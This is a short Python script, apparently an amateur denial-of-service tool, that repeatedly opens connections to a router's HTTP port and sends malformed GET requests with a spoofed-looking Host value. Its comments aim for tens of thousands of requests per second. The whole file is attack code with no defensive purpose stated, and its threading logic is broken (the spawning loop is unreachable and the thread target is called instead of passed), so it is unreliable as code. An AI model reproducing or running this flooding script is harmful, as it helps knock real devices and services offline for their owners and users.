# send mutliple request to a server around 50thousand per sec
import threading
import socket
# target can be a ip address or domain name
#router ip address
target='192.168.29.1'
# which srvice i m attacking thats has different port
# here we want to http
port= 80
fake_ip='182.21.20.32'

#
already_connected=0
#attack method
def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: /" + fake_ip + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.close()
        global already_connected
        already_connected+=1
        print(already_connected)
 # we need to run it multiple
    for i in range(500):
 #target function
        thred=threading.Thread(target=attack())
        thred.start()
